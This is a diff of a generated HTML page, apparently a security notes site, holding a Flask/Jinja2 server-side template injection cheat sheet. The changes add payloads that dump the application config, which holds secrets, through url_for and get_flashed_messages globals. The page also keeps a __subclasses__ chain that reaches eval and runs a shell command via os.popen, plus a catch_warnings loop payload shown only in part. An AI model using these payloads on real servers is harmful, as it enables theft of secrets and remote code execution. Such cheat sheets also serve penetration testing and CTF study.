@@ -2010,15 +2010,8 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#payload0" title="payload0" class="md-nav__link">
-    payload0
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#payload1" title="payload1" class="md-nav__link">
-    payload1
+  <a href="#_1" title="读配置" class="md-nav__link">
+    读配置
   </a>
   
 </li>
@@ -2250,15 +2243,8 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#payload0" title="payload0" class="md-nav__link">
-    payload0
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#payload1" title="payload1" class="md-nav__link">
-    payload1
+  <a href="#_1" title="读配置" class="md-nav__link">
+    读配置
   </a>
   
 </li>
@@ -2296,11 +2282,14 @@
                   <h1>Ssti</h1>
                 
                 <h2 id="flask-ssti">flask ssti<a class="headerlink" href="#flask-ssti" title="Permanent link">&para;</a></h2>
-<h3 id="payload0">payload0<a class="headerlink" href="#payload0" title="Permanent link">&para;</a></h3>
+<h3 id="_1">读配置<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span>{{url_for.__globals__[&#39;current_app&#39;].config}}
+{{get_flashed_messages.__globals__[&#39;current_app&#39;].config}}
+</pre></div>
+
 <div class="codehilite"><pre><span></span>{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls -r /*/*&quot;).read()&#39;)}}
 </pre></div>
 
-<h3 id="payload1">payload1<a class="headerlink" href="#payload1" title="Permanent link">&para;</a></h3>
 <p><code>{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
   {% for b in c.__init__.func_globals.values() %} 
